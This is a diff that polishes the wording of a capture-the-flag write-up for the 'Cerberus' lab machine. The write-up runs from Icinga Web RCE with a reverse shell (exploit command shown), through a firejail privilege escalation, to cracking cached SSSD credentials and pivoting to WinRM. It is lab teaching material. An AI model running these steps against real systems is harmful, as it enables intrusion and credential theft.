@@ -169,7 +169,7 @@ I then searched for any exploits and found that the service version was vulnerab
 
 ### RCE:
 
-For the RCE I was searching for the exploit and found this [Github Repo](https://github.com/JacobEbben/CVE-2022-24715). Using the script exploit.py & following the process from this [blog](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web) I got the revershell :
+To gain remote code execution (RCE), I searched for an exploit and came across a [Github Repo](https://github.com/JacobEbben/CVE-2022-24715).  I used the script exploit.py and followed the process outlined in this [blog](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web) to obtain a reverse shell. :
 
 ```
 python3 exploit.py -t http://icinga.cerberus.local:8080/icingaweb2/ -I 10.10.14.80 -P 53 -u matthew -p ****************** -e /home/kali/Downloads/HTB/cerberus/private_cerbereus -x http://127.0.0.1:8080/
@@ -192,11 +192,11 @@ HTTPConnectionPool(host='127.0.0.1', port=8080): Read timed out. (read timeout=2
 
 ### Escaping container:
 
-Now, I am inside the machine with active & stable reverse shell but I don't have access for the Matthews folder. Also, when I checked the machine IP I observed that it's starting from 172.16.X.X which in regular cases associated with the docker containers. So, it's clear that right now I am in the container environment.
+Now, I am inside the machine with active & stable reverse shell but I don't have access for the Matthews folder. Additionally, I noticed that the machine's IP address starts with 172.16.X.X, which is commonly associated with Docker containers. Therefore, it is clear that I am currently in a container environment.
 
 ![image](https://user-images.githubusercontent.com/87700008/226994767-14f91702-bcb3-4132-864a-d5e7dc11d002.png)
 
-I started with the manual enumeration & checked for the SUID binaries on the machine & I observed one unusual binary 'firejail'
+I began by conducting a manual enumeration and checking for SUID binaries on the machine. During my search, I discovered an unusual binary named 'firejail'.
 
 ```
 find / -type f -perm -u=s 2> /dev/null 
@@ -204,13 +204,13 @@ find / -type f -perm -u=s 2> /dev/null
 
 ![image](https://user-images.githubusercontent.com/87700008/226995578-4b6c91ef-7772-4307-a5bd-a3c18a15ba7a.png)
 
-I checked for the available exploits for 'firejail' & found this [blog](https://www.openwall.com/lists/oss-security/2022/06/08/10) with the exploit which we can use this to get to root.
+I checked for the available exploits for 'firejail' & found this [blog](https://www.openwall.com/lists/oss-security/2022/06/08/10) with the exploit that we can use to gain root access.
 
-I downloaded the exploit & executed it. I have to spawn another terminal with reverse shell to perform the exploit further :
+After downloading the exploit, I executed it. However, to perform further exploitation, I had to spawn another terminal with a reverse shell.
 
 ![image](https://user-images.githubusercontent.com/87700008/227173434-84241dde-9d52-46dd-b1f9-99579a8eddc5.png)
 
-In other terminal I followed the instruction of the firejoin exploit & got the root shell :
+In the other terminal, I followed the instructions for the firejail exploit and gained access to the root shell.
 
 ![image](https://user-images.githubusercontent.com/87700008/227173752-c4cc01ee-2aa3-4578-8f43-6170843231e7.png)
 
@@ -218,7 +218,7 @@ Now, I am root but the problem here is that I am still in the container & Matthe
 
 ![image](https://user-images.githubusercontent.com/87700008/227174119-ce002e87-412d-42d6-9f3a-74dde6a824f3.png)
 
-At the time of /etc/hosts enumeration I already observed that this device is joined with AD, so I searched on internet if it the Linux devices stores any credentials on the devices for authentication purpose & I found this [Red hat blog](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sssd-introduction).
+During my enumeration of the /etc/hosts file, I noticed that this device was joined to an Active Directory (AD) domain, so I searched on internet if it the Linux devices stores any credentials on the devices for authentication purpose & I found this [Red hat blog](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sssd-introduction).
 
 In this blog it's clearly mentioned that :
 
@@ -233,20 +233,21 @@ Most system authentication is configured locally, which means that services must
 SSSD also caches those users and credentials, so if the local system or the identity provider go offline, the user credentials are still available to services to verify.
 ```
 
-I serached for the file related to "sssd" & got many option, after performing some deeper analysis I found 1 directory among all these results, i.e. : "/var/lib/sss/db/" which contains the cached credentials.
+I searched for files related to 'sssd' and found several options, after performing some deeper analysis I found 1 directory among all these results, i.e. : "/var/lib/sss/db/" which contains the cached credentials.
 
 ![image](https://user-images.githubusercontent.com/87700008/227177805-0c1b36ac-e532-46cb-a7fb-615898f063ad.png)
 
-I checked the cached credentials with the strings command & found the sha512crypt hash in it, which looks like it belongs to Matthew.
+Using the strings command, I checked the cached credentials and found a sha512crypt hash that appeared to belong to Matthew.
 
 ![image](https://user-images.githubusercontent.com/87700008/227178326-2d74583f-6a39-489b-a030-29c3db034868.png)
 
-I used hashcat to crack the hash & fetch clear text password.
+I used hashcat to crack the hash and retrieve the plaintext password.
 
 ![image](https://user-images.githubusercontent.com/87700008/227181330-c5782ef0-b8ed-4c59-a729-69365dacb266.png)
 
-Now, I have the password for Matthew as well. At this point I uploaded a nmap binary I scanned for the top 10000 ports for the DC machine from inside the Linux machine
-After the completing of port scan I got port 5985 open, which is used for powershell remote logon.
+Now, I have the password for Matthew as well. Now that I had Matthew's password, I uploaded an Nmap binary and scanned the top 10,000 ports on the DC machine from within the Linux machine.
+
+After the completion of port scan I got port 5985 open, which is used for powershell remote logon.
 
 ![image](https://user-images.githubusercontent.com/87700008/227236303-e33da113-486b-40f4-afd9-b83b085f79b1.png)
 
@@ -268,7 +269,7 @@ For this purpose I will use "Chisel" binary & will run these commands on both de
 
 ### User flag:
 
-After the successfull connection I can connect to the WinRm from my machine using Evil-WinRm:
+After the successful connection I can connect to the WinRm from my machine using Evil-WinRm:
 
 ![image](https://user-images.githubusercontent.com/87700008/227540221-9aa20183-fbf1-4fd5-9482-334231282117.png)
 
